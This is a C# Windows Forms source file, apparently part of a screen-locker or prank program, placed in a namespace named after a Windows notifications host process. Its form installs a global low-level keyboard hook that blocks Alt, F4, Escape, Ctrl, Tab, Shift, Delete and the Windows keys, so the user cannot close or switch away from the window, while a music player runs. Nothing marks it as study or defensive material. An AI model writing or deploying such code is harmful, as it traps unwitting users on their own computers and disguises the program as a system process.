using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using KingVonPasswordManager;

namespace Notifications_host_process
{
    public partial class Form1 : Form
    {
        // Constants for low-level keyboard hook and key codes
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int VK_LWIN = 0x5B;
        private const int VK_RWIN = 0x5C;
        private const int VK_TAB = 0x09;
        private const int VK_ESCAPE = 0x1B;
        private const int VK_F4 = 0x73;
        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_ALT = 0x12;
        private const int VK_DELETE = 0x2E;

        private readonly MusicPlayer player;

        // Delegate for the low-level keyboard hook procedure
        private LowLevelKeyboardProc _proc;
        // Handle to the hook
        private IntPtr _hookID = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent(); // Initialize the form components
            _proc = HookCallback; // Assign the hook callback function
            _hookID = SetHook(_proc); // Set the low-level keyboard hook
            player = new MusicPlayer();
        }

        ~Form1()
        {
            UnhookWindowsHookEx(_hookID); // Unhook the low-level keyboard hook when the form is destroyed
        }

        private void Form1_Click(object sender, EventArgs e)
        {
            // Handle form click event (currently empty)
        }

        // Method to set the low-level keyboard hook
        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess()) // Get the current process
            using (var curModule = curProcess.MainModule) // Get the main module of the current process
            {
                // Set the low-level keyboard hook
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // Delegate for the low-level keyboard hook procedure
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Callback function for the low-level keyboard hook
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Check if a key is pressed
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam); // Get the virtual key code of the key pressed

                // Block specific key presses
                if (vkCode == VK_ALT || vkCode == VK_F4 || vkCode == VK_ESCAPE || vkCode == VK_CONTROL || vkCode == VK_TAB || vkCode == VK_SHIFT || vkCode == VK_LWIN || vkCode == VK_RWIN || vkCode == VK_DELETE)
                {
                    return (IntPtr)1; // Block the key press
                }
            }
            // Call the next hook in the chain
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // P/Invoke declarations for setting and removing the hook, and for calling the next hook
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
